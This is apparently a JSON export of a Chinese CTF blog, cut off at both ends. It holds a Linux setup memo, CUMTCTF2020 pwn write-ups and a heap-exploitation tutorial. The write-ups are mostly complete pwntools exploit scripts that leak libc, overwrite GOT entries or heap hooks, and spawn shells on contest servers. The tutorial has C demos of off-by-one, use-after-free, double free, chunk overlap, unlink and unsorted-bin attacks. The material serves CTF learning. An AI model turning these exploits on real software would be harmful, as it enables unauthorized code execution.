:log.success('&#123;&#125; = &#123;:#x&#125;'.format(name, addr))# io = process(\"./ciscn_2019_s_3\")p = remote(\"node3.buuoj.cn\",28985)elf = ELF('./ciscn_s_3')vuln_addr=0x4004EDmov_rax_execv_addr=0x4004E2 pop_rdi_ret_addr=0x4005a3 pop_rbx_rbp_r12_r13_r14_r15_ret_addr=0x40059A__libc_csu_init_addr=0x400580 # __libc_csu_init gadget 首地址syscall_addr=0x400501 #ida中查看payload1='/bin/sh\\x00'*2+p64(vuln_addr)sl(payload1)r(0x20)bin_sh_addr=uu64(r(8))-280leak(\"/bin/sh\",bin_sh_addr)payload2='/bin/sh\\x00'*2+p64(pop_rbx_rbp_r12_r13_r14_r15_ret_addr)+p64(0)*2+p64(bin_sh_addr+0x50)+p64(0)*3print(hex(bin_sh_addr+0x50))payload2+=p64(__libc_csu_init_addr)+p64(mov_rax_execv_addr)payload2+=p64(pop_rdi_ret_addr)+p64(bin_sh_addr)+p64(syscall_addr) sl(payload2)itr() 这就是ret2__libc_csu_init() 第二种先介绍SROP SROPSROP也是栈溢出，但不同ROP的是。 SROP使用能够调用sigreturn的gadget覆盖返回地址，并将一个伪造的sigcontext结构体放到栈中。","categories":[],"tags":[{"name":"刷题","slug":"刷题","permalink":"https://pz1o.top/tags/%E5%88%B7%E9%A2%98/"},{"name":"wp","slug":"wp","permalink":"https://pz1o.top/tags/wp/"}]},{"title":"linux备忘录","slug":"linux备忘录","date":"2021-01-23T06:22:17.000Z","updated":"2021-02-04T07:57:06.777Z","comments":true,"path":"2021/01/23/linux备忘录/","link":"","permalink":"https://pz1o.top/2021/01/23/linux%E5%A4%87%E5%BF%98%E5%BD%95/","excerpt":"","text":"主要记录一些基础的linux知识 0x01 安装PWN环境这里主要记录一下从0开始安装pwn环境 1.vmtools先挂载上 123tar zxpf VMwareTools-x.x.x-yyyy.tar.gzcd vmware-tools-distribsudo .&#x2F;vmware-install.pl 安装先输YES 之后直接回车 2.安装git1sudo apt-get install git 3.安装pippip2 1sudo apt install python-pip pip3 1sudo apt install python3-pip 4.安装vim12sudo apt-get remove vim-commonsudo apt-get install vim 5.安装pwntools1pip install pwntools 6.安装libcSearcher1234git clone https:&#x2F;&#x2F;github.com&#x2F;lieanu&#x2F;LibcSearcher.gitcd LibcSearchersudo python setup.py install把LibcSearcher.py放在exp相同目录下运行exp.py即可 1234567先安装libc库exp片段：from LibcSearcher import *elf&#x3D;ELF(&#39;libc.xx.xx&#39;)libc &#x3D; LibcSearcher(&#39;write&#39;,write_addr)offset &#x3D; write_addr - libc.dump(&#39;write&#39;)sys_addr &#x3D; offset + libc.dump(&#39;system&#39;) 7.安装One_gadget12sudo apt install rubysudo gem install one_gadget 8.安装pwndbg123git clone https:&#x2F;&#x2F;github.com&#x2F;pwndbg&#x2F;pwndbgcd pwndbg.&#x2F;setup.sh 9.安装ssh123sudo apt-get install openssh-server&#x2F;&#x2F;开启服务sudo service ssh start 配置文件/etc/ssh/sshd_config 10.安装condaconda是一个开源的软件包管理系统和环境管理系统，用于安装多个版本的软件包及其依赖关系，并在它们之间轻松切换。 1234567891011121314151617181920212223242526wget -c https:&#x2F;&#x2F;repo.continuum.io&#x2F;miniconda&#x2F;Miniconda3-latest-Linux-x86_64.shchmod 777 Miniconda3-latest-Linux-x86_64.shsh Miniconda3-latest-Linux-x86_64.sh &#x2F;&#x2F;配置源conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;pkgs&#x2F;free&#x2F;conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;pkgs&#x2F;main&#x2F;conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;cloud&#x2F;conda-forge&#x2F;conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;cloud&#x2F;bioconda&#x2F;conda config --set show_channel_urls yes conda config --get channels&#x2F;&#x2F;删除配置源conda config --remove-key channels&#x2F;&#x2F;环境命令conda env list&#x2F;&#x2F;创建环境conda create -n 3.6.7 python&#x3D;3.6.7&#x2F;&#x2F;切换环境conda activate&#x2F;&#x2F;退出环境conda deactivate&#x2F;&#x2F;移除环境conda remove -n env_name --all 0x02 一些命令0x06 用户和权限1.用户1.1 用户标识号0： root，超级用户。1-499：系统用户，保证系统服务正常运行，一般不使用。500-60000：普通用户，可登录系统，拥有一定的权限。管理员添加的用户在此范围内。 用户名和标识号不一定一一对应，Linux允许几个登录名对应同一个用户标识号。 系统内部管理进程和文件访问权限时使用用户标识号。 账号和标识号的对应关系在/etc/passwd文件中。 1.2 /etc/passwd该文件所有者和所属组为root，除了root用户外只有读取的权限。 格式为 登录名：口令：用户标识号：组标识号：注释：用户主目录：Shell程序 登录名：同意系统中唯一，大小敏感。口令：密码，root和用户可使用passwd命令修改。用户标识号：唯一。组标识号：每个用户可以同时属于多个组。注释：相关信息，真实姓名、联系电话等。mail和finger等会使用这些信息。用户主目录：用户登录后的默认工作目录。root为/root，一般用户在/home下。Shell程序：登录后默认启动的Shell程序。 1.3 /etc/shadow包含用户的密码和过期时间，只有root组可读写。 格式为 登录名：加密口令：最后一次修改时间：最小时间间隔：最大时间间隔：警告时间：密码禁用期：账户失效时间：保留字段 登录名：略。加密口令：*表示账户被锁定，！表示密码被锁定。其他的前三位表示加密方式。最后一次修改时间：最近修改密码的时间，天为单位，1970年1月1日算起。最小时间间隔：最小修改密码的时间间隔。最大时间间隔：最长密码有效期，到期要求修改密码。警告时间：密码过期后多久发出警告。密码禁用期：密码过期后仍然接受的最长期限。账号失效时间：账户的有效期，1970年1月1日算起，空串表示永不过期。保留字段：保留将来使用。 2.用户组Linux本身预定义了许多用户组，包括root、daemon、bin、sys等，用户可根据需要自行添加用户组。 用户组拥有组名、组标识号、组成员等属性。 2.1 /etc/group格式为 组名：口令：组标识号：成员列表 3. 用户管理123456789101112131415161718//adduseradd [option] 登录名//如果没有指定–system和–group选项，则创建普通用户。adduser [option] user//deluserdel [option] 用户名-f：强制删除（谨慎使用）-r：主目录中的文件一并删除。//edit passwdpasswd [option] 登录名//show user informationid [option] [用户]//change usersu [option] [用户名] 4.用户组管理把user换成group 0x07 一些小问题1.","categories":[{"name":"linux","slug":"linux","permalink":"https://pz1o.top/categories/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://pz1o.top/tags/linux/"}]},{"title":"CUMTCTF2020岁末赛","slug":"CUMTCTF2020岁末赛","date":"2020-12-26T14:32:03.000Z","updated":"2020-12-28T02:24:43.548Z","comments":true,"path":"2020/12/26/CUMTCTF2020岁末赛/","link":"","permalink":"https://pz1o.top/2020/12/26/CUMTCTF2020%E5%B2%81%E6%9C%AB%E8%B5%9B/","excerpt":"","text":"CUMTCTF2020岁末赛学长们可太搞了，比赛最后垂直上分可太秀了 只放PWN的题解了 下面几个题先放题解，等期末考完试来复现 PWNPWN1\\x00截断 12345678910from pwn import *p = process(\"./pwn1\")p = remote(\"219.219.61.234\",10000)payload = b\"\\x00\"*7 + p32(123)p.sendline(payload)p.interactive() PWN2在1的基础上puts泄露 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import*#from LibcSearcher import LibcSearcherr = remote('219.219.61.234',10001)#r = process(\"./pwn2\")elf = ELF('./pwn2')libc=ELF('/lib32/libc.so.6')#context(arch=\"i386\",os=\"linux\")payload1 = '\\x00'*7 + '\\xff'r.sendline(payload1)r.recvuntil(\"you_really_know_random_haha\")put_plt = elf.plt['puts']put_got = elf.got['puts']main = 0x80486D3payload2 = b'A'*(0x6c+0x4) + p32(put_plt) + p32(main) + p32(put_got)r.sendline(payload2)print(r.recv())put = u32(r.recv()[0:4])print(hex(put))#libc = LibcSearcher('puts',put)libcbase = put - libc.symbols['puts']system = libcbase + libc.symbols['system']binsh = next(libc.search(\"/bin/sh\"))print(hex(binsh))sh = libcbase + binshpayload1 = b'\\x00'*7 + b'\\xff'r.sendline(payload1)r.recvuntil(\"you_really_know_random_haha\")print(r.recv())payload3 = b\"A\"*(0x6c+4) + p32(system) + p32(0) + p32(sh)r.sendline(payload3)r.interactive() PWN3UAF 12345678910111213141516171819202122232425262728293031323334from pwn import *#r = remote(\"219.219.61.234\",10002)r = process(\"./pwn3\")def add(size,name): r.recvuntil(\":\") r.sendline(\"1\") r.recvuntil(\":\") r.sendline(str(size)) r.recvuntil(\":\") r.sendline(name)def delete(idx): r.recvuntil(\":\") r.sendline(\"2\") r.recvuntil(\":\") r.sendline(str(idx))def show(idx): r.recvuntil(\":\") r.sendline(\"3\") r.recvuntil(\":\") r.sendline(str(idx))magic = 0x8048986add(0x30,\"AAAA\")#0add(0x30,\"BBBB\")#1delete(0)delete(1)add(0x8,p32(magic))gdb.attach(r)show(0)r.interactive() PWN4(fail)1234567891011121314151617181920212223242526272829303132from pwn import *sh = process('./pwn4')sh = remote('219.219.61.234','10003')context.log_level='debug'context(arch='amd64',os='linux')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')#libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')elf = ELF('./pwn4')puts_got = elf.got['printf']sh.recv()sh.sendline('a')sh.recv()sh.sendline('3')key = '3xpL0r3R'sh.recv()sh.sendline(str(key))payload = 'aaaa%77$p'#6sh.sendline(payload)sh.recvuntil('aaaa0x')libc_base = int(int(sh.recv(12),16) - 0x20840)log.success(hex(libc_base))#gdb.attach(sh)puts_addr = libc_base + libc.sym['puts']log.success(hex(puts_addr))gad_get = [0x45226,0x4527a,0xf0364,0xf1207]one_addr = libc_base + gad_get[0]log.success(hex(one_addr))#gdb.attach(sh)payload = fmtstr_payload(6, &#123;puts_got:one_addr&#125;)sh.sendline(payload)sh.interactive() PWN5(fail)淦 这个题我以为给的libc就能用 没想到用的是本机的libc简直血亏 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import *r = remote(\"219.219.61.234\",10004)#r = process(\"./pwn5\")heap = ELF('./pwn5')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')#context.log_level = 'debug'def add(size,content): r.recvuntil(\":\") r.sendline(\"1\") r.recvuntil(\": \") r.sendline(str(size)) r.recvuntil(\": \") r.sendline(content)def change(idx,content): r.recvuntil(\":\") r.sendline(\"2\") r.recvuntil(\": \") r.sendline(str(idx)) r.recvuntil(\": \") r.sendline(content) #r.recvuntil(\":\") #r.sendline(name)def delete(idx): r.recvuntil(\":\") r.sendline(\"4\") r.recvuntil(\": \") r.sendline(str(idx))def show(idx): r.recvuntil(\":\") r.sendline(\"3\") r.recvuntil(\": \") r.sendline(str(idx))free_got = heap.got['free']add(0x18, 'AAAA') #0add(0x10, 'AAAA') #1change(0, \"/bin/sh\\x00\" + 'A'*0x10 + \"\\x41\")delete(1)#gdb.attach(r)add(0x30,p64(0)*4 + p64(0x20) + p64(heap.got['free']))show(1)r.recvuntil(\"Content: \")data = r.recvuntil(\"OK!\")free_addr = u64(data.split(\"\\n\")[0].ljust(8,'\\x00'))libc_base = free_addr -libc.symbols['free']log.success('libc base addr:'+hex(libc_base))system_addr = libc_base + libc.symbols[\"system\"]print(hex(system_addr))change(1,p64(system_addr))#gdb.attach(r)#print(hex(heap.got['free']))#add(0x10,\"/bin/sh\\x00\")#delete(2)delete(0)#delete(1)r.interactive() PWN6(fail)exp1: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970from pwn import *sh = process('./pwn6')sh = remote('219.219.61.234','10005')context.log_level = 'info'libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')#idx def add(idx,size,content): sh.recvuntil('Choice&gt;&gt; ') sh.sendline('1') sh.recvuntil(\"index&gt;&gt; \") sh.sendline(str(idx)) sh.recvuntil('size&gt;&gt; ') sh.sendline(str(size)) sh.recvuntil('name&gt;&gt; ') sh.sendline(str(content))def delete(idx): sh.recvuntil('Choice&gt;&gt; ') sh.sendline('2') sh.recvuntil(\"index&gt;&gt; \") sh.sendline(str(idx)) #sh.recvuntil('dele success')def edit(idx,content): sh.recv() sh.sendline(\"3\") sh.recv() sh.sendline(str(idx)) sh.recv() sh.sendline(str(content))def show(idx): sh.recvuntil('Choice&gt;&gt; ') sh.sendline('5') sh.recvuntil(\"index&gt;&gt; \") sh.sendline(str(idx))#leave message at bsssh.recvuntil('secret\\n')sh.sendline('aaa')sh.recvuntil('&gt;&gt; ')sh.sendline('2')#overwriteadd(0,0x130, 'aa')add(1,0x88, 'aa')delete(0)add(2,0x88,'aaaaaaa')#edit this to ....show(2)sh.recvuntil('aaaaaaa\\x0a')#sh.recv(8)libc_base = u64(sh.recv(6).ljust(8,'\\x00')) - 0x3c4ca8free_addr = libc_base + libc.sym['__free_hook']malloc_addr = libc_base + libc.sym['__malloc_hook']log.success(hex(free_addr))add(3,0x98,'aaa')#hide on 0add(4,0x98,'aaa')#hide on 0add(5,0x98,'aaa')#hide on 0add(6,0x98,'aaa')#hadd(7,0x98,'aaa')#x/30gx 0x602120 #bss_ptredit(2,0x88 * 'a' + '\\xb1')#delete(3)add(8,0x88,'aaa')#payload1 = 0x20 * 'a' + '\\x98' + 7 * '\\x00' + p64(free_addr)edit(8,payload1)#one_addr = libc_base + 0x45226 #0x4527a,0xf0364,0xf1207one_addr = libc_base + 0x4527apayload2 = p64(one_addr)edit(4,payload2)delete(4)#gdb.attach(sh)sh.interactive() exp2: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *elf = ELF('./pwn6')# p = elf.process()p = remote('219.219.61.234','10005')# libc = ELF('libc-2.23.so')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')# context.log_level = 'debug'def enter(): p.sendlineafter(\"important secret\",\"ld1ng\") p.sendlineafter(\"&gt;&gt;\",\"2\")def add(idx,size,con): p.sendlineafter('Your Choice&gt;&gt;','1') p.sendlineafter('index&gt;&gt;',str(idx)) p.sendlineafter('size&gt;&gt;',str(size)) p.sendlineafter('name&gt;&gt;',con)def edit(idx,con): p.sendlineafter('Your Choice&gt;&gt;','3') p.sendlineafter('index&gt;&gt;',str(idx)) p.sendafter('name&gt;&gt;',con)def delete(idx): p.sendlineafter('Your Choice&gt;&gt;','2') p.sendlineafter('index&gt;&gt;',str(idx))def show(idx): p.sendlineafter('Your Choice&gt;&gt;','5') p.sendlineafter('index&gt;&gt;',str(idx))enter()add(0,128,\"aaa\")add(1,128,\"bbb\")delete(0)show(0)libc_base = u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) - 88 - 0x10 -libc.sym['__malloc_hook']info(hex(libc_base))sys = libc_base + libc.sym[\"system\"]info(hex(sys))add(2,0x88,\"ccc\")add(3,0x88,\"ddd\")add(4,0x88,\"eee\")edit(0,'a'*0x88 + '\\xd1')delete(1)add(5,0xc8,\"fff\")edit(5,p64(0)*3+p64(0x21)+p64(0)*16+p64(0)+p64(0x21)+p64(0x88)+p64(0x602080)+p64(0))p.sendline(\"ls\")# add(6,0x80,\"ld1ng\")edit(3,p64(sys))#p.sendline(\"ls\")#p.sendline(\"cat flag\")# delete(4)p.interactive() PWN7(fail)&gt;&gt;&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#encoding: utf-8from pwn import *#sh = process(\"./pwn7\")sh = remote('219.219.61.234','10050')libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")def add(size, content): sh.recv() sh.sendline(\"1\") sh.recv() sh.sendline(str(size)) sh.recv() sh.sendline(str(content))def delete(idx): sh.recv() sh.sendline(\"2\") sh.recv() sh.sendline(str(idx))def show(idx): sh.recv() sh.sendline(\"3\") sh.recv() sh.sendline(str(idx))#step1: 构造出0x200的pre_sizefor i in range(10):#用到10个块 add(0x80,'a' * 0x80)for i in range(6):#六个进入tcahce delete(i)delete(9)#防止top_chunk合并for i in range(6,9): delete(i)#pre_size分别为0x0,0x100,0x200 （这里合并了）#到这里全部都free掉了，7个在tcache,3个在unsorted_bin#step2: 把0x100放入tcache 并由块7进入unsorted_bin提供libc#另外注意一下idxfor i in range(7): #占满tcache 这里是倒着的 6,5,4,3,2,1，x,x,x,0 add(0x8,p64(i))add(0x8,p64(7)) #切分unsorted_binadd(0x8,p64(8))add(0x8,p64(9)) #10个分配完毕for i in range(6): #这里idx=6没有释放 也就是最上面的 delete(i)delete(8) #进入tcache 带着0x100delete(7) #进入unsorted_bin 提供Libc add(0xf8, p64(0)) #这次分配的是idx=8的B块， 将C块的inuse位给清了delete(6) #填满tcachedelete(9) #促使块合并，但块8还在使用#step3: leak libcfor i in range(7): add(0x8, p64(i))add(0x8 ,p64(7))show(0)sh.recvuntil('&gt; ')libc_base = u64(sh.recv(6).ljust(8,\"\\x00\")) - 0x3ebca0log.success((hex(libc_base)))#gdb.attach(sh)add(0x10,'a')delete(1)delete(2)delete(0)delete(9)target = libc.symbols[\"__free_hook\"] + libc_baselog.success(hex(target))sys_addr = libc.symbols[\"system\"] + libc_baseone_addr = libc_base + 0x4f432 #0x4f2c5 add(0x10, p64(target))add(0x20, \"/bin/sh\\x00\")add(0x10, p64(one_addr))delete(1)#gdb.attach(sh)sh.interactive() 总结后面几个堆题有一个上次新生赛的原题，但就是做不出来 堆的东西还是不太熟悉，我tcl 马上考试了，先去复习了","categories":[{"name":"wp","slug":"wp","permalink":"https://pz1o.top/categories/wp/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/tags/PWN/"},{"name":"wp","slug":"wp","permalink":"https://pz1o.top/tags/wp/"}]},{"title":"堆漏洞及其利用","slug":"堆漏洞及其利用","date":"2020-12-22T13:17:06.000Z","updated":"2021-02-06T07:06:55.326Z","comments":true,"path":"2020/12/22/堆漏洞及其利用/","link":"","permalink":"https://pz1o.top/2020/12/22/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/","excerpt":"","text":"堆基础和堆漏洞还是分开比较好 这样看着也比较整齐 堆漏洞0x01 Off By One1.概念off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。 2.利用思路(1) 溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。 (2) 溢出字节为 NULL 字节：溢出的一个字节恰好覆盖下一堆块的size域的最低位，将PREV_INUSE位置0，这样前块会被认为是 free 块。这时可以选择使用 unlink 方法进行处理(后面将详细介绍)，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。 3.演示1234567891011121314151617#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main(void)&#123; char buffer[40]=\"\"; void *chunk1; chunk1=malloc(24); puts(\"Get Input\"); sleep(0);//断点 gets(buffer); if(strlen(buffer)==24) &#123; strcpy(chunk1,buffer); &#125; return 0;&#125; 这个程序的问题在于strlen 在计算长度的时候不会把结束符 ‘\\x00’ 计算在内，但strcpy 在拷贝的时候会把 ‘\\x00’ 也算上，所以就会造成 off by one。 我们先来调试一下 直接看堆情况 分配24字节上面为什么堆size为0x21也就是33字节 这个可以看上面的 因为它会把下面一个pre_size占用 输入24个A 可以很直观的看到确实是溢出了一个字节 0x02 Use After Free1.概念Use After Free(UAF)即释放后使用漏洞。若堆指针在释放后未置空，形成悬挂指针，当下次访问该指针时，依然能够访问原指针所指向的堆内容，形成漏洞。 2.利用条件 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。 内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。 3.演示123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef void (*func_ptr)(char *);void sys1(char command[])&#123;system(command);&#125;void echo(char content[])&#123;printf(\"%s\",content);&#125;int main()&#123; func_ptr *p1=(func_ptr*)malloc(4*sizeof(int));//申请了4个int大小的内存 printf(\"malloc addr: %p\\n\",p1);//因为前2个也就是0x10是用来管理chunk的 p1[2]=echo;//所以从第三个开始 p1[2](\"hello world\\n\"); free(p1); //在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针 p1[2](\"hello again\\n\"); //p1指针未被置空,虽然free了,但仍可使用. func_ptr *p2=(func_ptr*)malloc(4*sizeof(int)); //free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来 printf(\"malloc addr: %p\\n\",p2); printf(\"malloc addr: %p\\n\",p1);//p2与p1指针指向的内存为同一地址 p2[2]=sys1; //在这里将p1指针里面保存的echo函数指针覆盖成为了sys1指针. p1[2](\"/bin/sh\"); return 0;&#125; 我们可以看到这个p1和p2的地址是相同的 0x03 Double Free1.概念Double Free是UAF较为特殊的一种 2.演示12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main() &#123; fprintf(stderr, \"Allocating 3 buffers.\\n\"); char *a = malloc(9); char *b = malloc(9); char *c = malloc(9); strcpy(a, \"AAAAAAAA\"); strcpy(b, \"BBBBBBBB\"); strcpy(c, \"CCCCCCCC\"); fprintf(stderr, \"1st malloc(9) %p points to %s\\n\", a, a); fprintf(stderr, \"2nd malloc(9) %p points to %s\\n\", b, b); fprintf(stderr, \"3rd malloc(9) %p points to %s\\n\", c, c); fprintf(stderr, \"Freeing the first one %p.\\n\", a); free(a); fprintf(stderr, \"Then freeing another one %p.\\n\", b); free(b); fprintf(stderr, \"Freeing the first one %p again.\\n\", a); free(a); fprintf(stderr, \"Allocating 3 buffers.\\n\"); char *d = malloc(9); char *e = malloc(9); char *f = malloc(9); strcpy(d, \"DDDDDDDD\"); fprintf(stderr, \"4st malloc(9) %p points to %s the first time\\n\", d, d); strcpy(e, \"EEEEEEEE\"); fprintf(stderr, \"5nd malloc(9) %p points to %s\\n\", e, e); strcpy(f, \"FFFFFFFF\"); fprintf(stderr, \"6rd malloc(9) %p points to %s the second time\\n\", f, f);&#125; 直接根据输出理解其中的原理 也就是我上面画的这个图 0x04 overlap1.概念chunk extend 是堆漏洞的一种常见利用手法，通过 extend 可以实现 chunk overlapping 的效果。 2.利用条件 程序中存在基于堆的漏洞 漏洞可以控制 chunk header 中的数据 3.演示1（fastbin）123456789101112131415#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(void)&#123; void *ptr,*ptr1; ptr=malloc(0x10);//分配第一个0x10的chunk malloc(0x10);//分配第二个0x10的chunk sleep(0); //斷點 *(long long *)((long long)ptr-0x8)=0x41;// 修改第一个块的size域 free(ptr); ptr1=malloc(0x30);// 实现 extend，控制了第二个块的内容 return 0;&#125; 直接打断点 可以看到分配了两个 这时我们把p1的size位改变再进行释放，就会进入fastbin中 继续分配我们就可以把p2的数据改变 fastbin如我们所料 演示完成 这时我们就可以改变p2的数据 4.演示2（smallbin）1234567891011121314#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; void *ptr,*ptr1; ptr=malloc(0x80);//分配第一个 0x80 的chunk1 malloc(0x10); //分配第二个 0x10 的chunk2 malloc(0x10); //防止与top chunk合并 *(int *)((int)ptr-0x8)=0xb1; free(ptr); ptr1=malloc(0xa0);&#125; 直接断点 修改size值之后 释放 进入unsortedbin中 继续分配 我们这样就可以直接修改数据了 5.演示3（向前overlap）1234567891011121314151617#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(void)&#123; void *ptr1,*ptr2,*ptr3,*ptr4; ptr1=malloc(128);//smallbin1 ptr2=malloc(0x10);//fastbin1 ptr3=malloc(0x10);//fastbin2 ptr4=malloc(128);//smallbin2 malloc(0x10);//防止与top合并 free(ptr1); *(int *)((long long)ptr4-0x8)=0x90;//修改pre_inuse域 *(int *)((long long)ptr4-0x10)=0xd0;//修改pre_size域 free(ptr4);//unlink进行前向extend malloc(0x150);//占位块&#125; 断点 修改指针后 此时释放p4 进入unsortedbin中 如果进行分配 那么我们就可以向前overlap 我们最后来分配一下 0x05 unlink1.概念 双向链表中移除/添加一个chunk时，会发生断链的操作，这个断链的过程就叫做unlink 注意事项：unlink不发生在fastbin和smallbin中，所以fastbin和smallbin容易产生漏洞 2.发生场景malloc时： 从恰好大小合适的largebin中获取chunk，发生unlink 从比malloc要求大的largebin中取chunk，发生unlink free时： free之后，与前后空闲的chunk进行合并 malloc consolidate时： consolidate时，chunk之间的unlink realloc时： 向前扩展，合并物理相邻高地址空闲chunk 3.古老的unlink其中P为需要释放/添加的chunk unlink的代码 (1)将前一个chunk占用的内存合并到当前chunk; (2)修改指向当前chunk的指针，改为指向前一个chunk。 (3)使用unlink宏，将前一个free chunk从双向循环链表中移除 此例来自ctf-wiki 现在有物理空间连续的两个 chunk（Q，Nextchunk），其中 Q 处于使用状态、Nextchunk 处于释放状态。那么如果我们通过某种方式（比如溢出）将 Nextchunk 的 fd 和 bk 指针修改为指定的值。则当我们 free(Q) 时 glibc 判断这个块是 small chunk 判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并 判断后向合并，发现后一个 chunk 处于空闲状态，需要合并 继而对 Nextchunk 采取 unlink 操作 那么 unlink 具体执行的效果是什么样子呢？我们可以来分析一下 以下12和8都是对于32位来说的 FD=P-&gt;fd = target addr -12 BK=P-&gt;bk = expect value FD-&gt;bk = BK，即 *(target addr-12+12)=BK=expect value BK-&gt;fd = FD，即 *(expect value +8) = FD = target addr-12 这张图片应该更好理解 4.新的unlink新版的unlink加入了下面这部分代码 123&#x2F;&#x2F; fd bkif (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0)) \\ malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV); \\ 如果不指向P，那么就出现了问题 那如何利用呢？ 首先我们通过覆盖，将 nextchunk 的 FD 指针指向了 fakeFD，将 nextchunk 的 BK 指针指向了 fakeBK 。那么为了通过验证，我们需要 fakeFD -&gt; bk == P &lt;=&gt; *(fakeFD + 12) == P fakeBK -&gt; fd == P &lt;=&gt; *(fakeBK + 8) == P 当满足上述两式时，可以进入 Unlink 的环节，进行如下操作： fakeFD -&gt; bk = fakeBK &lt;=&gt; *(fakeFD + 12) = fakeBK fakeBK -&gt; fd = fakeFD &lt;=&gt; *(fakeBK + 8) = fakeFD 如果让 fakeFD + 12 和 fakeBK + 8 指向同一个指向 P 的指针，那么： *P = P - 8 *P = P - 12 即通过此方式，P 的指针指向了比自己低 12 的地址处。此方法虽然不可以实现任意地址写，但是可以修改指向 chunk 的指针，这样的修改是可以达到一定的效果的。 5.利用条件 UAF ，可修改 free 状态下 smallbin 或是 unsorted bin 的 fd 和 bk 指针 已知位置存在一个指针指向可进行 UAF 的 chunk 6.效果使得已指向 UAF chunk 的指针 ptr 变为 ptr - 0x18 0x06 house of force1.原理攻击者通过堆溢出或者其他方式，控制到topchunk的size成员，这样我们就可以使topchunk的地址超出正常的堆段的地址，这样我们就可以控制到超出堆段之外的内存 2.利用条件 ①通过堆溢出或其他方式，控制到topchunk的size成员 ②将topchunk的size成员变为一个非常大的数，这样topchunk就会超出内存中的堆段，从而访问到其他段的内存地址（got表的地址） ③此时通过malloc申请内存的时候，申请的就是got的内存地址，就可以更改got内存的内容 0x07 fastbin attack Fastbin Double Free House of Spirit Alloc to Stack Arbitrary Alloc 其中，前两种主要漏洞侧重于利用 free 函数释放真的 chunk 或伪造的 chunk，然后再次申请 chunk 进行攻击，后两种侧重于故意修改 fd 指针，直接利用 malloc 申请指定位置 chunk 进行攻击。 0x08 unsorted bin attack1.概念Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值。 2.使用情况 Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取。 在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。 3.原理解释 unsortedbin正常存储freechunk的结构如图所示，此时这个freechunk是我们还可以通过指针操控的（虽然free了但没有置空） 如果在取走堆块之前，我们将unsortedbin中的chunk的bk指针改为我们的target地址，如下图所示： 此时我们去malloc堆块的时候就会发生如下代码 1234/** victim is free chunk **/bck = victim-&gt;bk;unsorted_chunks(av)-&gt;bk = bck;bck-&gt;fd = unsorted_chunks(av); 在我们移除victim之后就变成了这样。我们的target的fd的内容为malloc_state结构体的unsortedbin链的fd指针了 4.演示123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main() &#123; fprintf(stderr, \"This file demonstrates unsorted bin attack by write a large \" \"unsigned long value into stack\\n\"); fprintf( stderr, \"In practice, unsorted bin attack is generally prepared for further \" \"attacks, such as rewriting the \" \"global variable global_max_fast in libc for further fastbin attack\\n\\n\"); unsigned long target_var = 0; fprintf(stderr, \"Let's first look at the target we want to rewrite on stack:\\n\"); fprintf(stderr, \"%p: %ld\\n\\n\", &amp;target_var, target_var); unsigned long *p = malloc(400); fprintf(stderr, \"Now, we allocate first normal chunk on the heap at: %p\\n\", p); fprintf(stderr, \"And allocate another normal chunk in order to avoid \" \"consolidating the top chunk with\" \"the first one during the free()\\n\\n\"); malloc(500); free(p); fprintf(stderr, \"We free the first chunk now and it will be inserted in the \" \"unsorted bin with its bk pointer \" \"point to 